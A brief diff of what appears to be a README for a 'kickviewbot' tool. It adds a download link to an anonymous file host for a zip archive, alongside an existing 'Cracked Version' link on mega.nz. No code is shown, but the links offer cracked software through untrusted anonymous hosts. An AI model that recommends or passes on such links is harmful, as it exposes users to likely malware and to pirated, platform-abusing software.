@@ -1,6 +1,8 @@
 
 File Larger then 25MB 
 Download Here.
+
+Download: https://anonymfile.com/77Vn/kickviewbot-main.zip
 Cracked Version: https://mega.nz/file/knFFgCwb#KpAbWkSnL-uwW56AViyCZ5cmN-P33l8ky0Bywq3oWwY
 
 ## New Features
